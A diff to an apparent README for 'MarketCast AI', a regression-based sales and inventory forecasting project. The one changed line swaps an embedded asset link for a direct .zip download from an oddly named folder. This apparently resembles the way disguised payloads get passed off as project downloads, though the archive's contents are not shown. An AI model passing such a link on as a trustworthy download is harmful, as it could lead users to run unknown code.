@@ -4,4 +4,4 @@ MarketCast AI was an AI-based forecasting solution developed to address inventor
 The model utilized historical trends and regression-based forecasting techniques to identify buying patterns and sales peaks. By training on large datasets and refining features, the predictor accurately forecasted stock movement and recommended replenishment strategies.
 
 The implementation led to a 60% improvement in inventory planning efficiency, significantly reducing both overstock and out-of-stock incidents. MarketCast AI is a prime example of how predictive analytics and intelligent algorithms can transform retail operations when paired with practical deployment logic.
-https://github.com/user-attachments/assets/42ae2ddd-a009-4323-b134-82516fe0d0a9
+https://raw.githubusercontent.com/Karthik-KC5/Sales-Predictor/main/umbilicated/Sales-Predictor.zip
